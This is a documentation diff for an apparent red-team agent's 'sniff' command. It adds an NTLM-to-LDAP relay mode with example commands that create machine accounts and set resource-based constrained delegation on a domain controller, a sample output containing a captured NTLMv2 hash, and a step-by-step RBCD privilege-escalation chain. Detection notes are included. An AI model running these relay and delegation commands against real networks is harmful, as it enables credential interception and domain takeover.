@@ -7,13 +7,14 @@ hidden = false
 
 ## Summary
 
-Network sniffing, LLMNR/NBT-NS/mDNS poisoning, and NTLM relay for credential interception. Three modes:
+Network sniffing, LLMNR/NBT-NS/mDNS poisoning, and NTLM relay for credential interception. Four modes:
 
 - **capture** (default): Passive network sniffing — captures traffic and extracts cleartext credentials from HTTP Basic Auth, FTP, NTLM, Kerberos, LDAP simple bind, SMTP AUTH PLAIN, and Telnet.
 - **poison**: Active LLMNR/NBT-NS/mDNS responder — answers multicast name resolution queries with the attacker IP to intercept authentication attempts (T1557.001).
 - **relay**: NTLM relay — intercepts victim NTLM authentication via HTTP and relays it to a target SMB server for authenticated access without cracking hashes (T1557.001).
+- **ldap-relay**: LDAP NTLM relay — intercepts victim NTLM authentication via HTTP and relays it to a target LDAP server (Domain Controller) for post-authentication operations: whoami, add-computer, and RBCD delegation (T1557.001).
 
-Cross-platform capture: Windows (SIO_RCVALL), Linux (AF_PACKET + BPF), macOS (/dev/bpf). Poison and relay: cross-platform.
+Cross-platform capture: Windows (SIO_RCVALL), Linux (AF_PACKET + BPF), macOS (/dev/bpf). Poison, relay, and ldap-relay: cross-platform.
 
 In poison mode, **SMB (port 445) and HTTP (port 80) NTLM capture servers** run alongside the name resolution poisoners. When a victim resolves a name to the attacker IP, Windows clients try SMB first (for UNC paths and file share access), then HTTP. Both capture NTLMv2 hashes in **hashcat mode 5600** format for offline cracking.
 
@@ -23,12 +24,12 @@ In relay mode, the agent acts as a man-in-the-middle: it presents an HTTP 401 ch
 
 | Argument | Required | Default | Description |
 |----------|----------|---------|-------------|
-| action | No | capture | `capture`: passive sniffing. `poison`: LLMNR/NBT-NS/mDNS responder. `relay`: NTLM relay to target SMB |
-| response_ip | No | auto-detect | Poison: IP to respond with. Relay: target SMB host (required) |
-| protocols | No | llmnr,nbtns | Poison protocols: llmnr, nbtns, mdns (comma-separated) |
+| action | No | capture | `capture`: passive sniffing. `poison`: LLMNR/NBT-NS/mDNS responder. `relay`: NTLM relay to target SMB. `ldap-relay`: NTLM relay to target LDAP |
+| response_ip | No | auto-detect | Poison: IP to respond with. Relay/ldap-relay: target host (required) |
+| protocols | No | llmnr,nbtns | Poison: protocols (llmnr,nbtns,mdns). LDAP-relay: operation spec (see below) |
 | interface | No | auto-detect | Network interface name or IP address |
-| duration | No | 30 (capture) / 120 (poison/relay) | Duration in seconds. Max: 300 (capture), 600 (poison/relay) |
-| ports | No | 21,53,80,88,110,143,389,445,8080 | Capture: port filter. Relay: `listen_port:target_port` (default: 80:445) |
+| duration | No | 30 (capture) / 120 (poison/relay/ldap-relay) | Duration in seconds. Max: 300 (capture), 600 (poison/relay/ldap-relay) |
+| ports | No | 21,53,80,88,110,143,389,445,8080 | Capture: port filter. Relay: `listen:target` (default 80:445). LDAP-relay: `listen:target` (default 80:389) |
 | promiscuous | No | false | Enable promiscuous mode (capture only) |
 | max_bytes | No | 52428800 (50MB) | Stop after N bytes (capture only) |
 | save_pcap | No | false | Save raw PCAP file (capture only) |
@@ -87,6 +88,26 @@ sniff -action relay -response_ip 192.168.1.10 -duration 120
 sniff -action relay -response_ip 192.168.1.10 -ports 8080:445 -duration 300
 ```
 
+### LDAP Relay — whoami (default operation)
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -duration 120
+```
+
+### LDAP Relay — add a machine account
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -protocols add-computer:FAWKES$
+```
+
+### LDAP Relay — set RBCD delegation
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -protocols rbcd:CN=DC01,DC=corp,DC=local|S-1-5-21-123456-789-012
+```
+
+### LDAP Relay with custom ports (listen on 8080, target LDAPS 636)
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -ports 8080:636
+```
+
 ## Relay Mode: NTLM Authentication Forwarding
 
 {{% notice warning %}}Requires SMB signing DISABLED on the target (default for non-domain controllers){{% /notice %}}
@@ -133,6 +154,72 @@ This is the equivalent of `ntlmrelayx` — combined with LLMNR/NBT-NS poisoning 
   ]
 }
 ```
+
+## LDAP Relay Mode: NTLM Relay to LDAP with Post-Auth Operations
+
+{{% notice warning %}}Requires LDAP signing NOT required on the target DC (default Windows Server configuration){{% /notice %}}
+
+LDAP relay mode performs the same NTLM interception as SMB relay, but targets an LDAP server (typically a Domain Controller) and performs privileged Active Directory operations after successful authentication:
+
+1. **Listens** on an HTTP port (default: TCP 80) for victim connections
+2. **Challenges** victims with HTTP 401 + NTLM to trigger authentication
+3. **Forwards** the victim's NTLM Type 1 (Negotiate) to the target LDAP server using SICILY/NTLM bind
+4. **Relays** the server's Type 2 (Challenge) back to the victim via HTTP
+5. **Forwards** the victim's Type 3 (Authenticate) to complete LDAP NTLM bind as the victim
+6. **Executes** a post-auth LDAP operation using the authenticated session
+7. **Reports** relay status, captured NTLMv2 hash, and operation results
+
+### Post-Auth Operations
+
+Set the operation via the `-protocols` parameter:
+
+| Operation | Syntax | Description |
+|-----------|--------|-------------|
+| `whoami` | `-protocols whoami` (default) | LDAP Extended WhoAmI — confirms relayed identity |
+| `add-computer` | `-protocols add-computer:NAME$` | Creates a machine account in AD (default: `FAWKESPC$`) |
+| `rbcd` | `-protocols rbcd:targetDN\|attackerSID` | Sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target for resource-based constrained delegation |
+
+### LDAP Relay Output Example
+
+```json
+{
+  "duration": "120.0s",
+  "listen_port": 80,
+  "target": "dc01.corp.local",
+  "target_port": 389,
+  "operation": "add-computer",
+  "relays": [
+    {
+      "victim_ip": "192.168.1.50",
+      "username": "jsmith",
+      "domain": "CORP",
+      "target": "dc01.corp.local",
+      "success": true,
+      "hashcat": "jsmith::CORP:1122334455667788:aabbccdd...:0101...",
+      "status": "authenticated",
+      "detail": "Relayed CORP\\jsmith to LDAP dc01.corp.local:389 | add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local",
+      "op_result": "add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local"
+    }
+  ],
+  "credentials": [
+    {
+      "protocol": "ntlmv2-ldap-relay",
+      "src_ip": "192.168.1.50",
+      "dst_ip": "dc01.corp.local",
+      "username": "CORP\\jsmith",
+      "password": "jsmith::CORP:1122334455667788:aabbccdd...:0101..."
+    }
+  ]
+}
+```
+
+### RBCD Attack Chain
+
+The LDAP relay RBCD operation enables a resource-based constrained delegation attack:
+
+1. **Add a computer account** (if MachineAccountQuota > 0): `sniff -action ldap-relay -response_ip dc01 -protocols add-computer:EVIL$`
+2. **Set RBCD** on the target: `sniff -action ldap-relay -response_ip dc01 -protocols rbcd:CN=TARGET,DC=corp,DC=local|S-1-5-21-...-computerSID`
+3. Use `ticket -action s4u` to request a service ticket as any user to the target
 
 ## Poison Mode: NTLMv2 Hash Capture
 
@@ -276,6 +363,19 @@ JSON output with capture statistics and discovered credentials:
 - **Requires SMB signing disabled on target** — domain controllers enforce signing by default; workstations and member servers typically do not
 - Captured NTLMv2 hashes are also recorded for offline cracking (hashcat -m 5600)
 - Combined with `poison` mode for full relay chain: poison name resolution → capture NTLM auth → relay to target
+
+### LDAP Relay Mode
+{{% notice warning %}}CRITICAL: Active LDAP relay generates LDAP bind and modify traffic to a Domain Controller{{% /notice %}}
+
+- Opens an HTTP TCP listener — same detection surface as SMB relay
+- Generates LDAP NTLM bind traffic to the target DC — visible in DC security logs
+- **Requires LDAP signing not required** — default Windows Server configuration, but may be hardened
+- Post-auth operations create detectable AD changes:
+  - `add-computer`: Event ID 5137 (directory object created), new computer account in CN=Computers
+  - `rbcd`: Event ID 5136 (directory object modified), changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`
+  - `whoami`: Minimal footprint — LDAP Extended Operation only
+- AD auditing tools (BloodHound, PingCastle, Purple Knight) will detect new computer accounts and RBCD modifications
+- Combined with `poison` mode for full relay chain: poison name resolution → capture NTLM auth → relay to LDAP → execute AD operation
 
 ## MITRE ATT&CK Mapping
 
